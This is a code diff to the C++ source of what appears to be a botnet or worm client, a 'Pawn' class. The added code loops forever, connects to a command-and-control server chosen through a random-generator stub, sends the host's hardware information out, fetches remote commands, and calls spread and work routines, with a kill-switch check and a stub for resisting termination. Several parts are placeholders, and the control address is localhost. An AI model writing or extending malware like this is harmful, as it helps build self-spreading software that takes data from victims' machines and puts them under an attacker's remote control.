@@ -11,8 +11,7 @@
 
 
 bool Pawn::sendMySelfData() {
-
-    return true;
+    return mypost(CC, sdc.hwInfo);
 }
 
 bool Pawn::checkSWKill() {
@@ -53,35 +52,71 @@ void Pawn::doWork() {
 }
 
 Pawn::Pawn() {
-    if (!checkSWKill()) {
-        systemData = SystemDataCollector();
-        bool sendSystemDataResult = sendMySelfData();
-        bool spreadResult = spread();
-        doWork();
-    }
 
+    while (true) {
+        if (!checkSWKill()) {
+            gen = PRNG();
+            sdc = SystemDataCollector();
+
+            connect2CC();
+            
+            std::cout << "trying to conSWKill disabled, I'm alive" << std::endl;
+
+            // get command from CC
+            std::string cccommand = getCommand();
+            bool sendSystemDataResult = sendMySelfData();
+            bool spreadResult = spread();
+            doWork();
+            std::cout << "gonna to sleep." << std::endl;
+            sleep(10000);
+        }
+
+    }
 
 }
 
 Pawn::~Pawn() { }
 
 
-bool Pawn::connect2CC() {
-    std::string CCIP = "127.0.0.1";
-    std::string CCPort = "13131";
+std::string Pawn::getCC(){
+    std::cout << "gen: " << gen.generate() << std::endl;
 
+    return "127.0.0.1:13131";
+
+}
+
+void Pawn::connect2CC() {
     std::map<std::string, std::string> dataQuickCheck;
     dataQuickCheck.insert(std::pair<std::string, std::string>("world", "1111"));
 
-    int connectCheckResult = mypost(CCIP+CCPort+"/hello", dataQuickCheck);
+    while (true) {
+        std::string possibleCC = getCC();
+        std::cout << "check CC : " << possibleCC << " ... " << std::endl;
 
-    return (bool)connectCheckResult;
+        // some check CC here ... => CCisCC = 1/0
+        bool CCisCC = true;
+        int checkCCConnect = mypost(possibleCC + "/hello", dataQuickCheck);
+
+        if (CCisCC && (bool)checkCCConnect) {
+            // CC is found
+            // get command && 'sleep'
+            CC = possibleCC;
+            break;
+        }
+    }
 }
 
 bool Pawn::sendData2IP() {
     return true;
 }
 
-void preventKill() {
+void Pawn::preventKill() {
     // monitor sent signals
+}
+
+std::string Pawn::getCommand() {
+    cpr::Response possibleCommand;
+    possibleCommand = myget(CC + "/getCommand");
+
+    return possibleCommand.text;
 }
